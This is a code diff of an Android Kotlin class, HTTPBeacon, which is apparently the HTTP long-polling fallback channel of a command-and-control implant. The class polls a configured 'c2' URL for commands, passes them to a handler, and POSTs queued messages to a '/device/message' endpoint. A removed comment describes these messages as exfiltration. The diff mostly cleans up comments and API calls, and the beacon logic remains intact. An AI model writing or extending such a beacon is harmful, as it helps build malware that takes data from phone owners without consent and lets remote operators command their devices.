@@ -1,14 +1,13 @@
-// ============================================================
-// FILE: android/app/src/main/java/com/xrc/comms/HTTPBeacon.kt
-// ============================================================
 package com.xrc.comms
 
 import android.content.Context
 import android.util.Log
 import com.xrc.core.config.XrcConfig
 import com.xrc.core.crypto.CryptoBox
+import com.xrc.core.crypto.Identity
 import kotlinx.coroutines.*
 import okhttp3.*
+import java.util.concurrent.TimeUnit
 
 /**
  * HTTPBeacon — HTTP long-polling fallback channel.
@@ -34,13 +33,10 @@ class HTTPBeacon(
 
     private var running = false
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
-    private val mediaType = MediaType.parse("application/json")!!
+    private val mediaType = "application/json".toMediaType()
 
     private var pendingQueue = mutableListOf<String>()
 
-    /**
-     * Start polling for commands.
-     */
     fun start() {
         if (running) return
         running = true
@@ -52,9 +48,6 @@ class HTTPBeacon(
         }
     }
 
-    /**
-     * Send an exfil message via HTTP POST.
-     */
     fun send(message: Message): Boolean {
         return try {
             val url = "${config.c2.http_url}/device/message"
@@ -74,9 +67,6 @@ class HTTPBeacon(
         }
     }
 
-    /**
-     * Enqueue a message for next poll cycle.
-     */
     fun enqueue(message: Message) {
         synchronized(pendingQueue) {
             pendingQueue.add(message.serialize())
@@ -110,16 +100,13 @@ class HTTPBeacon(
     }
 
     private fun handleResponse(body: String) {
-        // Process any pending commands from server
         try {
             val msg = Protocol.json.decodeFromString<Message>(body)
-            // Forward to message handler
             onMessage?.invoke(msg)
         } catch (e: Exception) {
             Log.w(TAG, "Invalid poll response: ${e.message}")
         }
 
-        // Flush pending queue
         synchronized(pendingQueue) {
             val queue = pendingQueue.toList()
             pendingQueue.clear()
@@ -149,7 +136,6 @@ class HTTPBeacon(
     }
 
     var onMessage: ((Message) -> Unit)? = null
-
     fun isRunning(): Boolean = running
     fun stop() { running = false; scope.cancel() }
 }
